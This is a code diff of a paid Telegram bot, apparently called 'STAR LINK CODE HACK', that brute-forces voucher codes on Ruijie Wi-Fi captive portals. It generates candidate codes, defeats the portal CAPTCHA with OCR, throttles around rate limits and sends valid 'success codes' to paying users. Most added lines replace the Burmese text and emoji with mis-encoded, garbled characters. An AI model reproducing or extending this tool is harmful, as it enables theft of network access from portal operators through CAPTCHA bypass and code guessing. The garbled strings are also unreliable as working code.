+        await bot.reply_to(message, "á€›á€•á€ºá€á€”á€·á€ºá€›á€”á€º Scan á€™á€›á€¾á€­á€•á€«á‹", reply_markup=get_back_keyboard())
 
 @bot.message_handler(commands=["status"])
 async def cmd_status(message):
@@ -952,19 +973,19 @@ async def cmd_status(message):
     elapsed = max(1.0, time.monotonic() - gs["start_ts"])
     avg_speed = gs["total_checked"] / elapsed * 60
     text = (
-        f"🪫 <b>Bot Live Dashboard</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"⏳ Uptime        : {h}h {m}m {s}s\n"
-        f"🔍 Active Scans  : <b>{active}</b> / {MAX_CONCURRENT_SCANS}\n"
-        f"🎫 Paid Users    : {len(paid_users)}\n"
-        f"👥 Sessions      : {len(user_data)}\n"
-        f"📦 Total Checked : <b>{gs['total_checked']:,}</b>\n"
-        f"✅ Total Hits    : <b>{gs['total_hits']}</b>\n"
-        f"🛡 Rate-limits   : {gs['rate_limits']}\n"
-        f"⚡ Avg Speed     : <b>{avg_speed:,.0f}</b> c/min\n"
-        f"🔗 Concurrency   : {CONCURRENCY}\n"
-        f"📦 Batch Size    : {BATCH_SIZE}\n"
-        f"🏊 Session Pool  : {SESSION_POOL_SIZE}"
+        f"ðŸª« <b>Bot Live Dashboard</b>\n"
+        f"â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+        f"â³ Uptime        : {h}h {m}m {s}s\n"
+        f"ðŸ” Active Scans  : <b>{active}</b> / {MAX_CONCURRENT_SCANS}\n"
+        f"ðŸŽ« Paid Users    : {len(paid_users)}\n"
+        f"ðŸ‘¥ Sessions      : {len(user_data)}\n"
+        f"ðŸ“¦ Total Checked : <b>{gs['total_checked']:,}</b>\n"
+        f"âœ… Total Hits    : <b>{gs['total_hits']}</b>\n"
+        f"ðŸ›¡ Rate-limits   : {gs['rate_limits']}\n"
+        f"âš¡ Avg Speed     : <b>{avg_speed:,.0f}</b> c/min\n"
+        f"ðŸ”— Concurrency   : {CONCURRENCY}\n"
+        f"ðŸ“¦ Batch Size    : {BATCH_SIZE}\n"
+        f"ðŸŠ Session Pool  : {SESSION_POOL_SIZE}"
     )
     await bot.reply_to(message, text, parse_mode="HTML")
 
@@ -975,18 +996,18 @@ async def cmd_recheck(message):
     if not await is_paid(user_id):
         await bot.reply_to(
             message,
-            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+            f"âŒ á€žá€„á€ºá user ID á€€á€­á€¯ registered á€™á€œá€¯á€•á€ºá€›á€žá€±á€¸á€•á€«á‹\n\n"
+            f"PAID USER á€–á€¼á€…á€ºá€›á€”á€º Admin {ADMIN_USERNAME} á€žá€­á€¯á€· á€†á€€á€ºá€žá€½á€šá€ºá€•á€«á‹",
         )
         return
     if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
-        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်ပါ။")
+        await bot.reply_to(message, "Scan á€œá€¯á€•á€ºá€›á€”á€º Portal URL á€€á€­á€¯á€¡á€›á€„á€ºá€‘á€Šá€·á€ºá€•á€«á‹")
         return
     results = await db_get_results(user_id)
     if not results:
-        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
+        await bot.reply_to(message, "á€žá€„á€·á€ºá€á€½á€„á€º success code á€á€…á€ºá€á€¯á€™á€»á€¾á€™á€›á€¾á€­á€žá€±á€¸á€•á€«á‹")
         return
-    await bot.reply_to(message, "Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
+    await bot.reply_to(message, "Success Code á€™á€»á€¬á€¸á€¡á€¬á€¸ á€•á€¼á€”á€ºá€œá€Šá€ºá€…á€…á€ºá€†á€±á€¸á€”á€±á€•á€«á€žá€Šá€ºá‹")
     session_url = user_data[chat_id]["session_url"]
     recheck_list: List[str] = []
     for code in results:
@@ -996,11 +1017,11 @@ async def cmd_recheck(message):
         if recode:
             recheck_list.append(recode)
     if recheck_list:
-        entries = [f"🎫 <code>{c}</code>" for c in recheck_list]
+        entries = [f"ðŸŽ« <code>{c}</code>" for c in recheck_list]
         body = format_premium_success_list(entries)
         await bot.reply_to(message, body, parse_mode="HTML")
     else:
-        await bot.reply_to(message, "Code များအားလုံးစစ်ပြီး success code မတွေ့ပါ။")
+        await bot.reply_to(message, "Code á€™á€»á€¬á€¸á€¡á€¬á€¸á€œá€¯á€¶á€¸á€…á€…á€ºá€•á€¼á€®á€¸ success code á€™á€á€½á€±á€·á€•á€«á‹")
     await db_set_results(user_id, recheck_list)
 
 @bot.message_handler(commands=["clearprogress"])
@@ -1013,7 +1034,84 @@ async def cmd_clearprogress(message):
         lambda: _get_conn().execute("DELETE FROM scan_progress WHERE user_id=?", (user_id,))
         or _get_conn().commit()
     )
-    await bot.reply_to(message, "✅ Scan progress ရှင်းလင်းပြီးပါပြီ။ နောက်တစ်ခါ အစကနေ စပါမည်။")
+    await bot.reply_to(message, "âœ… Progress á€›á€¾á€„á€ºá€¸á€•á€¼á€®á€¸á€•á€«á€•á€¼á€®")
+
+# ============================================================
+# MINI APP (WebApp) DATA HANDLER
+# ============================================================
+@bot.message_handler(content_types=["web_app_data"])
+async def on_webapp_data(message):
+    """Handle actions sent from the Premium Mini App UI."""
+    chat_id = message.chat.id
+    user_id = str(chat_id)
+    user_name = message.from_user.first_name or message.from_user.username or "User"
+    raw = ""
+    try:
+        raw = message.web_app_data.data if message.web_app_data else ""
+        payload = json.loads(raw) if raw else {}
+    except Exception:
+        payload = {"action": raw}
+
+    action = str(payload.get("action", "")).strip()
+    log.info("webapp action=%s user=%s", action, user_id)
+
+    if action == "scan":
+        await safe_send(
+            chat_id,
+            "ðŸ”— Portal URL á€‘á€Šá€·á€ºá€•á€«\n<code>/portal [URL]</code>\n\ná€•á€¼á€®á€¸á€›á€„á€º Voucher mode á€›á€½á€±á€¸á€•á€«",
+            reply_markup=get_voucher_keyboard(),
+        )
+    elif action == "paid":
+        await safe_send(
+            chat_id,
+            f"ðŸŽ« <b>Paid User</b>\nðŸ†” <code>{user_id}</code>\n\n"
+            f"Admin á€‘á€¶ ID á€•á€±á€¸á€•á€¼á€®á€¸ Key á€á€šá€ºá€•á€«\nðŸ‘¨â€ðŸ’» {ADMIN_USERNAME}",
+            reply_markup=get_paid_keyboard(),
+        )
+    elif action == "result":
+        if not await is_paid(user_id):
+            await safe_send(chat_id, f"âŒ á€™á€¾á€á€ºá€•á€¯á€¶á€á€„á€º á€™á€œá€¯á€•á€ºá€›á€žá€±á€¸á€•á€«\nAdmin: {ADMIN_USERNAME}")
+            return
+        results = await db_get_results(user_id)
+        if results:
+            entries = [f"ðŸŽ« <code>{c}</code>" for c in results]
+            await safe_send(chat_id, format_premium_success_list(entries))
+        else:
+            await safe_send(chat_id, "ðŸ“­ Success code á€™á€›á€¾á€­á€žá€±á€¸á€•á€«")
+    elif action == "recheck":
+        await cmd_recheck(message)
+    elif action == "stop":
+        await cmd_stop(message)
+    elif action.startswith("mode_"):
+        mode = action.replace("mode_", "", 1)
+        # map short names
+        mode_map = {
+            "6": "6", "7": "7", "8": "8", "9": "9",
+            "mixed": "mixed", "all": "all",
+            "mixed8": "mixed8", "mixed9": "mixed9",
+            "ascii-lower": "ascii-lower", "ascii-lower9": "ascii-lower9",
+        }
+        mode = mode_map.get(mode, mode)
+        user_data.setdefault(chat_id, {})
+        if "session_url" not in user_data[chat_id]:
+            await safe_send(chat_id, "ðŸ”— Portal URL á€¡á€›á€„á€ºá€‘á€Šá€·á€ºá€•á€«\n<code>/portal [URL]</code>")
+            return
+        if mode in ("6", "7", "8", "9"):
+            await safe_send(
+                chat_id,
+                f"ðŸ”¢ <b>{mode} á€œá€¯á€¶á€¸</b>\ná€‘á€­á€•á€ºá€…á€®á€¸ á€”á€¶á€•á€«á€á€º á€›á€½á€±á€¸á€•á€« ðŸ‘‡",
+                reply_markup=get_digit_keyboard(mode),
+            )
+        else:
+            user_data[chat_id]["selected_mode"] = mode
+            user_data[chat_id]["start_digit"] = None
+            await safe_send(
+                chat_id,
+                f"ðŸŽ¯ Mode: <code>{mode}</code>\n\nðŸš€ START á€€á€­á€¯á€”á€¾á€­á€•á€ºá€•á€«",
+                reply_markup=get_start_scam_keyboard(),
+            )
+    else:
+        await safe_send(chat_id, "âœ¨ Menu á€™á€¾ á€›á€½á€±á€¸á€•á€«", reply_markup=get_main_keyboard(paid=await is_paid(user_id)))
 
 # ============================================================
 # CALLBACK HANDLER
@@ -1029,16 +1127,20 @@ async def on_callback(call):
         if data == "menu_back":
             if await is_paid(user_id):
                 text = (
-                    "✨ <b>STAR LINK CODE HACK</b> ✨\n\n"
-                    f"🪪 <b>NAME</b>: {user_name}\n📜 <b>USER ID</b>: <code>{user_id}</code>\n\n"
-                    "🎫 PAID USER - Unlimited Access"
+                    "âœ¨ <b>STAR LINK</b> âœ¨\n"
+                    "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+                    f"ðŸ‘¤ {user_name}\n"
+                    f"ðŸ†” <code>{user_id}</code>\n\n"
+                    "ðŸ’Ž <b>Paid User</b> Â· Unlimited Access"
                 )
             else:
                 text = (
-                    "✨ <b>STAR LINK CODE HACK</b> ✨\n\n"
-                    f"🪪 <b>NAME</b>: {user_name}\n📜 <b>USER ID</b>: <code>{user_id}</code>\n\n"
-                    "⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-                    "PAID USER ဖြစ်ရန် PAID USER ကိုနှိပ်ပါ။"
+                    "âœ¨ <b>STAR LINK</b> âœ¨\n"
+                    "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+                    f"ðŸ‘¤ {user_name}\n"
+                    f"ðŸ†” <code>{user_id}</code>\n\n"
+                    "âš ï¸ á€™á€¾á€á€ºá€•á€¯á€¶á€á€„á€º á€™á€œá€¯á€•á€ºá€›á€žá€±á€¸á€•á€«\n"
+                    "ðŸŽ« Paid User á€€á€­á€¯á€”á€¾á€­á€•á€ºá€•á€«"
                 )
             await safe_edit_text(chat_id, call.message.message_id, text, get_main_keyboard())
             return
@@ -1047,18 +1149,17 @@ async def on_callback(call):
             if not await is_paid(user_id):
                 await safe_edit_text(
                     chat_id, call.message.message_id,
-                    f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-                    f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    f"âŒ á€™á€¾á€á€ºá€•á€¯á€¶á€á€„á€º á€™á€œá€¯á€•á€ºá€›á€žá€±á€¸á€•á€«\nAdmin: {ADMIN_USERNAME}",
                     get_back_keyboard(),
                 )
                 return
             await safe_edit_text(
                 chat_id, call.message.message_id,
-                "🔗 Portal URL ထည့်သွင်းရန်:\n\n"
-                "/portal [your_portal_url]\n\n"
-                "ဥပမာ:\n"
-                "/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00\n\n"
-                "Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်။",
+                "ðŸ”— <b>Portal URL á€‘á€Šá€·á€ºá€›á€”á€º</b>\n\n"
+                "<code>/portal [URL]</code>\n\n"
+                "á€¥á€•á€™á€¬:\n"
+                "<code>/portal https://portal-as.ruijienetworks.com/...</code>\n\n"
+                "âš ï¸ URL á€¡á€žá€…á€ºá€‘á€Šá€·á€ºá€›á€„á€º á€¡á€Ÿá€±á€¬á€„á€ºá€¸ á€•á€»á€€á€ºá€™á€Šá€º",
                 get_back_keyboard(),
             )
             return
@@ -1066,12 +1167,12 @@ async def on_callback(call):
         if data == "menu_paid":
             await safe_edit_text(
                 chat_id, call.message.message_id,
-                "🔑 <b>PAID USER ဖြစ်ရန်</b>\n\n"
-                "ကျေးဇူးပြု၍ သင်၏ USER ID ကိုထည့်ပါ။\n\n"
-                f"USER ID: <code>{user_id}</code>\n\n"
-                f"✅ USER ID ကို Admin ထံပေးပြီး Key ဝယ်ပါ။\n"
-                f"👨‍💻 Admin: {ADMIN_USERNAME}\n\n"
-                "Key ရရှိပြီးပါက PAID USER ဖြစ်ရန် နှိပ်ပါ",
+                "ðŸŽ« <b>Paid User á€–á€¼á€…á€ºá€›á€”á€º</b>\n"
+                "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+                f"ðŸ†” <code>{user_id}</code>\n\n"
+                f"ðŸ‘† ID á€€á€­á€¯ Admin á€‘á€¶ á€•á€±á€¸á€•á€¼á€®á€¸ Key á€á€šá€ºá€•á€«\n"
+                f"ðŸ‘¨â€ðŸ’» {ADMIN_USERNAME}\n\n"
+                "Key á€›á€•á€¼á€®á€¸á€›á€„á€º á€¡á€±á€¬á€€á€ºá€€ á€á€œá€¯á€á€ºá€”á€¾á€­á€•á€ºá€•á€« âœ…",
                 get_paid_keyboard(),
             )
             return
@@ -1083,27 +1184,26 @@ async def on_callback(call):
                 user_data.setdefault(chat_id, {})
                 await safe_edit_text(
                     chat_id, call.message.message_id,
-                    f"✅ <b>PAID USER</b> ဖြစ်ပါပြီ။\n\nUSER ID: <code>{user_id}</code>\n\nMenu မှ ရွေးချယ်ပါ။",
+                    f"âœ… <b>Paid User</b> á€–á€¼á€…á€ºá€•á€«á€•á€¼á€®!\nðŸ†” <code>{user_id}</code>\n\nMenu á€™á€¾ á€›á€½á€±á€¸á€•á€« ðŸ‘‡",
                     get_main_keyboard(),
                 )
             elif user_id in auth:
                 await safe_edit_text(
                     chat_id, call.message.message_id,
-                    f"❌ Key Expired ဖြစ်နေပါသည်။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    f"âŒ Key á€žá€€á€ºá€á€™á€ºá€¸á€€á€¯á€”á€ºá€”á€±á€•á€«á€á€šá€º\nAdmin: {ADMIN_USERNAME}",
                     get_back_keyboard(),
                 )
             else:
                 for admin_id in ADMINS:
                     await safe_send(
                         int(admin_id),
-                        f"🔔 <b>New User Request</b>:\nName: {user_name}\nID: <code>{user_id}</code>\n\n"
-                        f"To approve:\n/genkey unlimited {user_id}",
+                        f"ðŸ”” <b>New Request</b>\nðŸ‘¤ {user_name}\nðŸ†” <code>{user_id}</code>\n\n"
+                        f"/genkey unlimited {user_id}",
                     )
                 await safe_edit_text(
                     chat_id, call.message.message_id,
-                    f"🙏 ကျေးဇူးပြု၍ Paid ဝယ်ပါ။\n\nUSER ID: <code>{user_id}</code>\n\n"
-                    f"Admin မှ သင့် ID ကို အတည်ပြုပြီးပါက PAID USER ဖြစ်ပါမည်။\n"
-                    f"👨‍💻 Admin: {ADMIN_USERNAME}",
+                    f"ðŸ“© Request á€•á€­á€¯á€·á€•á€¼á€®á€¸á€•á€«á€•á€¼á€®\nðŸ†” <code>{user_id}</code>\n\n"
+                    f"Admin á€¡á€á€Šá€ºá€•á€¼á€¯á€•á€¼á€®á€¸á€›á€„á€º Paid á€–á€¼á€…á€ºá€•á€«á€™á€šá€º\nðŸ‘¨â€ðŸ’» {ADMIN_USERNAME}",
                     get_back_keyboard(),
                 )
             return
@@ -1112,18 +1212,18 @@ async def on_callback(call):
             if not await is_paid(user_id):
                 await safe_edit_text(
                     chat_id, call.message.message_id,
-                    f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nAdmin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    f"âŒ á€™á€¾á€á€ºá€•á€¯á€¶á€á€„á€º á€™á€œá€¯á€•á€ºá€›á€žá€±á€¸á€•á€«\nAdmin: {ADMIN_USERNAME}",
                     get_back_keyboard(),
                 )
                 return
             results = await db_get_results(user_id)
             if results:
-                entries = [f"🎫 <code>{c}</code>" for c in results]
+                entries = [f"ðŸŽ« <code>{c}</code>" for c in results]
                 text = format_premium_success_list(entries)
                 if len(text) > 4096:
                     text = text[:4090] + "..."
             else:
-                text = "📋 Success code မရှိသေးပါ။"
+                text = "ðŸ“­ Success code á€™á€›á€¾á€­á€žá€±á€¸á€•á€«"
             await safe_edit_text(chat_id, call.message.message_id, text, get_back_keyboard())
             return
 
@@ -1131,20 +1231,20 @@ async def on_callback(call):
             if not await is_paid(user_id):
                 await safe_edit_text(
                     chat_id, call.message.message_id,
-                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    f"âŒ á€™á€¾á€á€ºá€•á€¯á€¶á€á€„á€º á€™á€œá€¯á€•á€ºá€›á€žá€±á€¸á€•á€«\nAdmin: {ADMIN_USERNAME}",
                     get_back_keyboard(),
                 )
                 return
             if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
                 await safe_edit_text(
                     chat_id, call.message.message_id,
-                    "🔗 Portal URL အရင်ထည့်ပါ:\n\n/portal [your_portal_url]",
+                    "ðŸ”— Portal URL á€¡á€›á€„á€ºá€‘á€Šá€·á€ºá€•á€«\n<code>/portal [URL]</code>",
                     get_back_keyboard(),
                 )
                 return
             await safe_edit_text(
                 chat_id, call.message.message_id,
-                "🔄 Recheck စတင်နေပါသည်...",
+                "ðŸ”„ Recheck á€œá€¯á€•á€ºá€”á€±á€•á€«á€á€šá€º...",
                 get_scam_button_keyboard(),
             )
             await cmd_recheck(call.message)
@@ -1157,12 +1257,12 @@ async def on_callback(call):
                 d["scan_id"] = None
                 d["task"].cancel()
                 try:
-                    await bot.answer_callback_query(call.id, "🛑 Scan ရပ်လိုက်ပါပြီ။", show_alert=True)
+                    await bot.answer_callback_query(call.id, "ðŸ›‘ Scan á€›á€•á€ºá€œá€­á€¯á€€á€ºá€•á€«á€•á€¼á€®á‹", show_alert=True)
                 except Exception:
                     pass
             else:
                 try:
-                    await bot.answer_callback_query(call.id, "Scan မရှိပါ။", show_alert=True)
+                    await bot.answer_callback_query(call.id, "Scan á€™á€›á€¾á€­á€•á€«á‹", show_alert=True)
                 except Exception:
                     pass
             return
@@ -1171,7 +1271,7 @@ async def on_callback(call):
             if not await is_paid(user_id):
                 await safe_edit_text(
                     chat_id, call.message.message_id,
-                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    f"âŒ á€™á€¾á€á€ºá€•á€¯á€¶á€á€„á€º á€™á€œá€¯á€•á€ºá€›á€žá€±á€¸á€•á€«\nAdmin: {ADMIN_USERNAME}",
                     get_back_keyboard(),
                 )
                 return
@@ -1180,14 +1280,14 @@ async def on_callback(call):
             if "session_url" not in user_data[chat_id]:
                 await safe_edit_text(
                     chat_id, call.message.message_id,
-                    "🔗 Portal URL အရင်ထည့်ပါ:\n\n/portal [your_portal_url]",
+                    "ðŸ”— Portal URL á€¡á€›á€„á€ºá€‘á€Šá€·á€ºá€•á€«\n<code>/portal [URL]</code>",
                     get_back_keyboard(),
                 )
                 return
             if mode in ("6", "7", "8", "9"):
                 await safe_edit_text(
                     chat_id, call.message.message_id,
-                    f"🔢 VOUCHER <b>{mode}</b> လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ —",
+                    f"ðŸ”¢ <b>{mode} á€œá€¯á€¶á€¸</b>\ná€‘á€­á€•á€ºá€…á€®á€¸ á€”á€¶á€•á€«á€á€º á€›á€½á€±á€¸á€•á€« ðŸ‘‡",
                     get_digit_keyboard(mode),
                 )
                 return
@@ -1195,7 +1295,7 @@ async def on_callback(call):
             user_data[chat_id]["start_digit"] = None
             await safe_edit_text(
                 chat_id, call.message.message_id,
-                f"🔍 VOUCHER: <code>{mode}</code>\n\n✅ START SCAM ကိုနှိပ်ပြီး စတင်ပါ။",
+                f"ðŸŽ¯ Mode: <code>{mode}</code>\n\nðŸš€ START á€€á€­á€¯á€”á€¾á€­á€•á€ºá€•á€«",
                 get_start_scam_keyboard(),
             )
             return
@@ -1209,13 +1309,13 @@ async def on_callback(call):
             user_data[chat_id]["selected_mode"] = mode
             if digit == "random":
                 user_data[chat_id]["start_digit"] = str(random.randint(0, 9))
-                label = f"Random ({user_data[chat_id]['start_digit']}xxx…)"
+                label = f"ðŸŽ² Random ({user_data[chat_id]['start_digit']}â€¦)"
             else:
                 user_data[chat_id]["start_digit"] = digit
-                label = f"{digit} မှစ၍"
+                label = f"{digit}xxxâ€¦"
             await safe_edit_text(
                 chat_id, call.message.message_id,
-                f"🔍 VOUCHER: <code>{mode}</code>\n🔢 ထိပ်စီး: <b>{label}</b>\n\n✅ START SCAM ကိုနှိပ်ပါ။",
+                f"ðŸŽ¯ Mode: <code>{mode}</code>\nðŸ”¢ Start: <b>{label}</b>\n\nðŸš€ START á€€á€­á€¯á€”á€¾á€­á€•á€ºá€•á€«",
                 get_start_scam_keyboard(),
             )
             return
@@ -1224,21 +1324,21 @@ async def on_callback(call):
             if not await is_paid(user_id):
                 await safe_edit_text(
                     chat_id, call.message.message_id,
-                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    f"âŒ á€™á€¾á€á€ºá€•á€¯á€¶á€á€„á€º á€™á€œá€¯á€•á€ºá€›á€žá€±á€¸á€•á€«\nAdmin: {ADMIN_USERNAME}",
                     get_back_keyboard(),
                 )
                 return
             if chat_id not in user_data or "selected_mode" not in user_data.get(chat_id, {}):
                 await safe_edit_text(
                     chat_id, call.message.message_id,
-                    "❌ VOUCHER အမျိုးအစား မရွေးရသေးပါ။",
+                    "âŒ Mode á€™á€›á€½á€±á€¸á€›á€žá€±á€¸á€•á€«",
                     get_voucher_keyboard(),
                 )
                 return
             mode = user_data[chat_id]["selected_mode"]
             await safe_edit_text(
                 chat_id, call.message.message_id,
-                f"🔍 Scan စတင်နေပါသည်...\n\n🔢 Mode: <code>{mode}</code>",
+                f"ðŸ”¥ <b>Scan á€…á€á€„á€ºá€”á€±á€•á€«á€á€šá€ºâ€¦</b>\nðŸŽ¯ <code>{mode}</code>",
                 get_scam_button_keyboard(),
             )
             await _start_scan(chat_id, mode, message=call.message, user_name=user_name)
@@ -1401,7 +1501,7 @@ async def get_session_id(
         return previous_session_id
 
 # ============================================================
-# CAPTCHA — Multi-pass OCR
+# CAPTCHA â€” Multi-pass OCR
 # ============================================================
 async def Captcha_Image(sess: aiohttp.ClientSession, session_id: str) -> bytes:
     headers = {
@@ -1645,14 +1745,14 @@ async def Code_Expires_Date(active_id: str) -> Tuple[str, Any]:
                         )
 
                         lines: List[str] = []
-                        lines.append(f"┃ 📋 Plan     : <b>{profile}</b>")
+                        lines.append(f"â”ƒ ðŸ“‹ Plan     : <b>{profile}</b>")
 
                         if total_mins is not None:
-                            lines.append(f"┃ ⏳ Total    : <b>{minute_to_hour(total_mins)}</b>")
+                            lines.append(f"â”ƒ â³ Total    : <b>{minute_to_hour(total_mins)}</b>")
                         if remain_mins is not None:
-                            lines.append(f"┃ 🟢 Remain   : <b>{minute_to_hour(remain_mins)}</b>")
+                            lines.append(f"â”ƒ ðŸŸ¢ Remain   : <b>{minute_to_hour(remain_mins)}</b>")
                         if used_mins is not None:
-                            lines.append(f"┃ 🔴 Used     : <b>{minute_to_hour(used_mins)}</b>")
+                            lines.append(f"â”ƒ ðŸ”´ Used     : <b>{minute_to_hour(used_mins)}</b>")
 
                         if total_flow is not None or remain_flow is not None:
                             def _fmt_flow(v):
@@ -1666,18 +1766,18 @@ async def Code_Expires_Date(active_id: str) -> Tuple[str, Any]:
                                 except Exception:
                                     return str(v)
                             if total_flow is not None:
-                                lines.append(f"┃ 📦 Traffic  : {_fmt_flow(total_flow)}")
+                                lines.append(f"â”ƒ ðŸ“¦ Traffic  : {_fmt_flow(total_flow)}")
                             if remain_flow is not None:
-                                lines.append(f"┃ 🟢 Left     : {_fmt_flow(remain_flow)}")
+                                lines.append(f"â”ƒ ðŸŸ¢ Left     : {_fmt_flow(remain_flow)}")
                             if used_flow is not None:
-                                lines.append(f"┃ 🔴 Used Data: {_fmt_flow(used_flow)}")
+                                lines.append(f"â”ƒ ðŸ”´ Used Data: {_fmt_flow(used_flow)}")
 
                         if expire_at:
-                            lines.append(f"┃ 📅 Expire   : <code>{expire_at}</code>")
+                            lines.append(f"â”ƒ ðŸ“… Expire   : <code>{expire_at}</code>")
 
                         # Fallback if almost nothing found
                         if len(lines) <= 1:
-                            lines.append(f"┃ ⏳ Time     : <b>{minute_to_hour(remain_mins or total_mins or 'Unknown')}</b>")
+                            lines.append(f"â”ƒ â³ Time     : <b>{minute_to_hour(remain_mins or total_mins or 'Unknown')}</b>")
 
                         detail = "\n".join(lines) + "\n"
                         return detail, remain_mins if remain_mins is not None else total_mins
@@ -1685,7 +1785,7 @@ async def Code_Expires_Date(active_id: str) -> Tuple[str, Any]:
                     continue
     except Exception as e:
         log.debug("Code_Expires_Date outer error: %s", e)
-    return "┃ 📋 Plan     : Unknown\n┃ ⏳ Time     : Unknown\n", "Unknown"
+    return "â”ƒ ðŸ“‹ Plan     : Unknown\nâ”ƒ â³ Time     : Unknown\n", "Unknown"
 
 # ============================================================
 # PERFORM CHECK
@@ -1800,7 +1900,7 @@ async def perform_check(
             await asyncio.sleep(rate_state["sleep"] if rate_state else 0.5)
             continue
 
-        # Success path → slowly reduce backoff
+        # Success path â†’ slowly reduce backoff
         if rate_state is not None and rate_state.get("sleep", 0) > RATE_LIMIT_BASE_SLEEP:
             rate_state["sleep"] = max(RATE_LIMIT_BASE_SLEEP, rate_state["sleep"] * 0.85)
         break
@@ -1826,9 +1926,9 @@ async def perform_check(
         # Premium success alert (with notification)
         try:
             alert = (
-                f"🎉 <b>SUCCESS HIT!</b>\n\n"
+                f"ðŸŽ‰ <b>SUCCESS HIT!</b>\n\n"
                 f"{entry}\n\n"
-                f"⏱ {datetime.now(timezone.utc).strftime('%H:%M:%S UTC')}"
+                f"â± {datetime.now(timezone.utc).strftime('%H:%M:%S UTC')}"
             )
             await bot.send_message(chat_id, alert, parse_mode="HTML", disable_notification=False)
         except Exception:
@@ -1867,7 +1967,7 @@ async def perform_check(
                 body = "\n".join(limited_texts[chat_id][-25:])
                 if len(body) > 3700:
                     body = body[-3700:]
-                text = f"⚠️ <b>Limited Codes</b>\n\n<code>{body}</code>"
+                text = f"âš ï¸ <b>Limited Codes</b>\n\n<code>{body}</code>"
                 if chat_id not in limited_messages:
                     sent = await bot.send_message(chat_id, text, parse_mode="HTML")
                     limited_messages[chat_id] = sent.message_id
@@ -1946,7 +2046,7 @@ async def run_bruteforce(
                 except StopIteration:
                     break
             if not batch:
-                # finished sequential range → clear progress
+                # finished sequential range â†’ clear progress
                 if mode in ("6", "7", "8"):
                     await db_clear_progress(str(chat_id), mode, start_digit)
                 break
@@ -1954,7 +2054,7 @@ async def run_bruteforce(
             now = time.monotonic()
             if now - last_key_check >= KEY_RECHECK_INTERVAL:
                 if not await is_paid(str(chat_id)):
-                    await safe_send(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
+                    await safe_send(chat_id, "á€žá€„á€ºá key á€žá€€á€ºá€á€™á€ºá€¸ á€€á€¯á€”á€ºá€†á€¯á€¶á€¸á€žá€½á€¬á€¸á€•á€«á€•á€¼á€®á‹")
                     break
                 last_key_check = now
 
@@ -2010,17 +2110,17 @@ async def run_bruteforce(
             found = len(success_texts.get(chat_id, []))
             if total is not None:
                 finish = (
-                    f"✅ <b>Scan Finished</b>\n\n"
-                    f"📦 Checked : <b>{checked:,}</b> / {total:,}\n"
-                    f"✅ Found   : <b>{found}</b>\n"
-                    f"📊 Progress: 100%\n"
-                    f"<code>[██████████████████]</code>"
+                    f"âœ… <b>Scan Finished</b>\n\n"
+                    f"ðŸ“¦ Checked : <b>{checked:,}</b> / {total:,}\n"
+                    f"âœ… Found   : <b>{found}</b>\n"
+                    f"ðŸ“Š Progress: 100%\n"
+                    f"<code>[â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ]</code>"
                 )
             else:
                 finish = (
-                    f"✅ <b>Scan Finished / Stopped</b>\n\n"
-                    f"📦 Checked : <b>{checked:,}</b>\n"
-                    f"✅ Found   : <b>{found}</b>"
+                    f"âœ… <b>Scan Finished / Stopped</b>\n\n"
+                    f"ðŸ“¦ Checked : <b>{checked:,}</b>\n"
+                    f"âœ… Found   : <b>{found}</b>"
                 )
             ok = await safe_edit_text(chat_id, progress_msg.message_id, finish)
             if not ok:
@@ -2061,7 +2161,7 @@ async def _send_success_file(chat_id: int) -> None:
             f.write("\n".join(texts))
         with open(fname, "rb") as f:
             await bot.send_document(
-                chat_id, f, caption="✅ Scan finished — Success Codes file."
+                chat_id, f, caption="âœ… Scan finished â€” Success Codes file."
             )
     except Exception as e:
         log.debug("send_success_file error: %s", e)
@@ -2116,32 +2216,43 @@ async def check_session_url_improved(session_url: str, use_proxy: bool = False) 
         return False
 
 # ============================================================
-# WEB SERVER
+# WEB SERVER (+ Mini App static)
 # ============================================================
 async def _web_root(_request):
-    return web.Response(text="Bot is awake and running 24/7! (v4.0 Ultimate)")
+    return web.Response(text="Bot is awake and running 24/7! (v4.2 MiniApp)")
 
 async def _web_health(_request):
     return web.json_response(
         {
             "status": "ok",
-            "version": "4.0",
+            "version": "4.2",
             "uptime": int(time.monotonic() - _start_time),
             "active_scans": active_scans_count,
             "total_checked": _global_stats["total_checked"],
             "total_hits": _global_stats["total_hits"],
+            "webapp": bool(_WEBAPP_URL or os.environ.get("RAILWAY_PUBLIC_DOMAIN")),
         }
     )
+
+async def _web_app_index(_request):
